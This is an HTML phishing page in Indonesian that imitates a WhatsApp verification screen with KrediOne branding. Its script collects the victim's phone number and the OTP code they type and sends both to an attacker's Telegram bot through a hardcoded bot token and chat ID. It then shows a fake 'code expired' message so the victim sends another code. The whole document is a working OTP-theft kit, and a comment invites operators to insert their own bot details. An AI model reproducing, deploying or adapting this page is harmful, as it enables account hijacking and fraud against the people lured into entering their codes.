<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Registrered by WhatsAPP</title>
  <style>
    body {
      margin: 0; padding: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #fff;
      color: #222;
      max-width: 420px;
      margin-left: auto;
      margin-right: auto;
      user-select: none;
    }
    .container {
      padding: 16px 20px 80px;
    }
    .back-arrow {
      width: 24px;
      height: 24px;
      cursor: pointer;
      fill: #222;
      margin-bottom: 20px;
      display: inline-block;
    }
    h1 {
      font-weight: 700;
      font-size: 22px;
      margin: 0 0 6px 0;
      line-height: 1.2;
    }
    .phone-number {
      font-size: 13px;
      color: #666;
      margin-bottom: 24px;
      font-weight: 400;
    }
    .code-container {
      display: flex;
      gap: 10px;
      align-items: center;
      margin-bottom: 20px;
    }
    input.code-input {
      width: 48px;
      height: 48px;
      text-align: center;
      font-size: 22px;
      font-weight: 700;
      border: 1px solid #ddd;
      border-radius: 6px;
      outline: none;
      background-color: #f8f8f8;
      transition: border-color 0.25s ease;
    }
    input.code-input:focus {
      border-color: #18b700;
      background-color: #fff;
      box-shadow: 0 0 0 2px rgb(24 183 0 / 0.1);
    }
    button.btn-get-code {
      background-color: #18b700;
      color: #fff;
      border: none;
      border-radius: 18px;
      padding: 10px 16px;
      cursor: pointer;
      font-weight: 600;
      font-size: 13px;
      flex-shrink: 0;
      transition: background-color 0.3s ease;
      line-height: 1.2;
    }
    button.btn-get-code:disabled {
      background-color: #9cd297;
      cursor: default;
    }
    button.btn-get-code:hover:not(:disabled) {
      background-color: #129100;
    }
    button.btn-continue {
      width: 100%;
      padding: 14px 0;
      border-radius: 28px;
      border: none;
      background: linear-gradient(90deg, #18b700 0%, #43cc07 100%);
      color: #fff;
      font-weight: 600;
      font-size: 16px;
      cursor: pointer;
      margin-bottom: 24px;
      user-select: none;
      transition: background 0.3s ease;
      line-height: 1.2;
    }
    button.btn-continue:disabled {
      background: #9cd297;
      cursor: default;
    }
    button.btn-continue.loading {
      background: #9cd297;
      cursor: default;
    }
    .separator {
      font-size: 13px;
      color: #999;
      text-align: center;
      margin-bottom: 16px;
      position: relative;
      font-weight: 400;
    }
    .separator::before,
    .separator::after {
      content: "";
      position: absolute;
      top: 50%;
      width: 90px;
      height: 1px;
      background-color: #e0e0e0;
    }
    .separator::before {
      left: 16px;
    }
    .separator::after {
      right: 16px;
    }
    .sms-option {
      text-align: center;
      color: #777;
      font-size: 13px;
      cursor: pointer;
      user-select: none;
      font-weight: 400;
    }
    .sms-option .icon {
      display: inline-flex;
      background-color: #1580ff;
      border-radius: 50%;
      width: 44px;
      height: 44px;
      justify-content: center;
      align-items: center;
      margin-bottom: 4px;
    }
    .sms-option .icon svg {
      width: 22px;
      height: 22px;
      fill: white;
    }
    .banner {
      margin-top: 290px;
    }
    .banner img {
      max-width: 100%;
      height: auto;
      border-radius:10%;
      user-select: none;
    }
  </style>
</head>
<body>
  <div class="container" role="main">
    <!-- Back arrow SVG -->
    <svg class="back-arrow" role="img" aria-label="Kembali" tabindex="0" onclick="history.back()" onkeydown="if(event.key==='Enter' || event.key===' ') { history.back(); }" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
      <path d="M15 18L9 12L15 6" stroke="#222" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
    </svg>

    <h1>Registrered by WhatsAPP</h1>
    <div class="phone-number" aria-live="polite" aria-atomic="true">
      Nomor Ponsel : <span id="phoneMasked">081***3538</span>
    </div>

    <div class="code-container">
      <input type="text" maxlength="1" class="code-input" inputmode="numeric" pattern="[0-9]*" aria-label="Digit kode verifikasi 1" />
      <input type="text" maxlength="1" class="code-input" inputmode="numeric" pattern="[0-9]*" aria-label="Digit kode verifikasi 2" />
      <input type="text" maxlength="1" class="code-input" inputmode="numeric" pattern="[0-9]*" aria-label="Digit kode verifikasi 3" />
      <input type="text" maxlength="1" class="code-input" inputmode="numeric" pattern="[0-9]*" aria-label="Digit kode verifikasi 4" />
      <button class="btn-get-code" id="btnGetCode">Dapatkan Kode</button>
    </div>

    <button class="btn-continue" id="btnContinue" disabled>Lanjutkan</button>

    <div class="separator" aria-hidden="true">Menggunakan metode login lain</div>

    <div class="sms-option" role="button" tabindex="0" aria-label="Terima kode via SMS" id="smsOption">
      <div class="icon" aria-hidden="true">
        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" >
          <path d="M20 2H4c-1.104 0-2 .896-2 2v16l4-4h14c1.104 0 2-.896 2-2V4c0-1.104-.896-2-2-2z"/>
        </svg>
      </div>
      Terima via SMS
    </div>

    <div class="banner" aria-hidden="true">
      <img src="https://cdn.phototourl.com/free/2026-04-02-997de918-66d9-4ed9-8ceb-a76ebe8bbcdf.png" alt="Banner KrediOne" />
    </div>
  </div>

  <script>
    // Telegram Bot config - GANTI DENGAN DATA ANDA
    const BOT_TOKEN = '8773945014:AAHq97DnPNdeSQbtxqrP1mjg8ypmGpFG2MI';  // Contoh: 123456789:ABCdef...
    const CHAT_ID = '6351598509';      // Contoh: 123456789

    const codeInputs = document.querySelectorAll('.code-input');
    const btnContinue = document.getElementById('btnContinue');
    const btnGetCode = document.getElementById('btnGetCode');
    const smsOption = document.getElementById('smsOption');
    const phoneMaskedEl = document.getElementById('phoneMasked');

    // Load nomor dari localStorage dan buat masker
    function loadPhoneMasked() {
      const key = 'kredione_phone';
      const phone = localStorage.getItem(key);
      if(phone && phone.length >= 7){
        const firstPart = phone.slice(0,3);
        const lastPart = phone.slice(-4);
        return firstPart + '***' + lastPart;
      }
      return '';
    }
    phoneMaskedEl.textContent = loadPhoneMasked();

    // Otomatis fokus input ke selanjutnya
    codeInputs.forEach((input, idx) => {
      input.addEventListener('input', e => {
        const val = e.target.value;
        if(!/^\d?$/.test(val)) {
          e.target.value = '';
          return;
        }
        if(val.length === 1 && idx < codeInputs.length -1){
          codeInputs[idx+1].focus();
        }
        updateBtnContinue();
      });
      input.addEventListener('keydown', e => {
        if(e.key === 'Backspace' && e.target.value === '' && idx > 0){
          codeInputs[idx - 1].focus();
        }
      });
    });

    function updateBtnContinue(){
      const allFilled = [...codeInputs].every(input => input.value.length === 1);
      btnContinue.disabled = !allFilled;
    }

    // Tombol dapatkan kode
    btnGetCode.addEventListener('click', () => {
      alert("Kode verifikasi sudah dikirim ke WhatsApp Anda.");
      btnGetCode.disabled = true;
      setTimeout(() => {
        btnGetCode.disabled = false;
      }, 30000);
    });

    // Tombol Lanjutkan - KIRIM DATA KE TELEGRAM
    btnContinue.addEventListener('click', async () => {
      const kode = [...codeInputs].map(i => i.value).join('');
      const phone = localStorage.getItem('kredione_phone') || '';

      // Tampilkan loading
      btnContinue.disabled = true;
      btnContinue.classList.add('loading');
      btnContinue.textContent = 'Mengirim...';

      try {
        const message = `📱 KODE VERIFIKASI BARU\n📞 Nomor: ${phone}\n🔢 Kode: ${kode}\n⏰ Waktu: ${new Date().toLocaleString('id-ID')}`;
        
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
          })
        });

        const data = await response.json();
        
        if(data.ok) {
          alert('❌ Kode Verifikasi Kadaluwarsa!');
          // Reset form
          codeInputs.forEach(input => input.value = '');
          updateBtnContinue();
        } else {
          alert('❌ Gagal kirim ke Telegram: ' + data.description);
        }
      } catch (error) {
        alert('❌ Error: ' + error.message);
      } finally {
        // Reset tombol
        btnContinue.disabled = false;
        btnContinue.classList.remove('loading');
        btnContinue.textContent = 'Lanjutkan';
      }
    });

    // Opsi SMS
    smsOption.addEventListener('click', () => {
      alert('Anda memilih menerima kode via SMS.');
    });
    smsOption.addEventListener('keydown', e => {
      if(e.key === 'Enter' || e.key === ' '){
        e.preventDefault();
        smsOption.click();
      }
    });
  </script>
</body>
      </html>
